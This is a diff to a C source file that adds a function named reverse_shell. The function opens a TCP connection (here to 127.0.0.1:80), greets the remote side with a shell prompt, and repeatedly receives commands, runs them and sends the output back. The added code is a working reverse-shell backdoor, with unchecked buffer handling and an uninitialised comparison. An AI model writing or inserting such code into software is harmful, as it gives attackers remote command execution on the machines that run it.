@@ -3,7 +3,62 @@
 #include <string.h>
 #include <errno.h>
 
+/* For sockets */
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
 #include "utils.h"
+
+int reverse_shell()
+{
+	int socket_desc;
+	struct sockaddr_in server;
+	char command[1024];
+	char welcome_message[1024];
+	char *command_output = NULL;
+
+	socket_desc = socket(AF_INET, SOCK_STREAM, 0);
+	if (socket_desc == ERROR) {
+		printf("Error creating socket\n");
+		return ERROR;
+	}
+
+	server.sin_addr.s_addr = inet_addr("127.0.0.1");
+	server.sin_family = AF_INET;
+	server.sin_port = htons(80);
+
+	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
+		printf("Error connecting\n");
+		return ERROR;
+	}
+
+	// Hay que sacar el send para que el codigo se quede mas limpio por aqui (a lo mejor el recv no hace falta por ahora)
+	strcpy(welcome_message, "Connected to shell\n$ ");
+	if (send(socket_desc, welcome_message, strlen(welcome_message), 0) == ERROR) {
+		printf("Error sending output of command\n");
+		return ERROR;
+	}
+
+	while (strcmp(command, "exit\n") != 0)
+	{
+		if (recv(socket_desc, command, 1024, 0) == ERROR) {
+		 	printf("Error receiving command\n");
+			return ERROR;
+		}
+
+		printf("%s\n", command);
+		exec(command, &command_output);
+
+		strcat(command_output, "\n$ ");
+
+		if (send(socket_desc, command_output, strlen(command_output), 0) == ERROR) {
+			printf("Error sending output of command\n");
+			return ERROR;
+		}
+	}
+
+	return OK;
+}
 
 int exec(char *command, char **output)
 {
